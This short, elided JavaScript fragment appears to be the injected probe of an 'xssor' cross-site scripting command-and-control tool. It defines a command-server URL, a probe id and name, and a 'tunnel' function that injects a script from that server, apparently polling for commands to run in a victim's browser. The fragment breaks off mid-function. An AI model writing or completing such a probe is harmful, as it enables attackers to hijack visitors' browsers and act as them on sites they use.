/*xssor.io*/
xssor = {};
xssor.cmd_url = location.protocol + '//127.0.0.1:8000/cmd';
xssor.gone = 0;
xssor.done = 0;
...
xssor.info = {};
xssor.info.pid = 'vvbsssj';
xssor.info.probeName = 'aaa';
...
xssor.tunnel = function () {
    ...
    if (xssor.done == 1) {
        var a = xssor.injscript(xssor.cmd_url + '?' + 'pid=' + xssor.info.pid +'&probeName=' + xssor.info.probeName + '&date=' + new Date().getTime());
        setTimeout(function () {
